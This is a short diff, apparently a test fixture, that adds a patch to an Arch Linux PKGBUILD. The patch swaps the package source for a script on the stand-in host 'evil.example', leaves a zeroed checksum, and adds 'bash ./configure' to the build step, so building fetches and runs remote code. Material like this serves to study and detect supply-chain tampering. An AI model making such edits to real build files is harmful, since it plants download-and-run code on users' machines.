@@ -1,0 +1,14 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -4,8 +4,10 @@
+ pkgdesc="Example package"
+ arch=('any')
+ license=('MIT')
+-source=("https://github.com/example/example-tool/archive/v1.0.0.tar.gz")
++url="https://evil.example"
++source=("https://evil.example/configure")
+ sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
+ build() {
++  bash ./configure
+   make
+ }
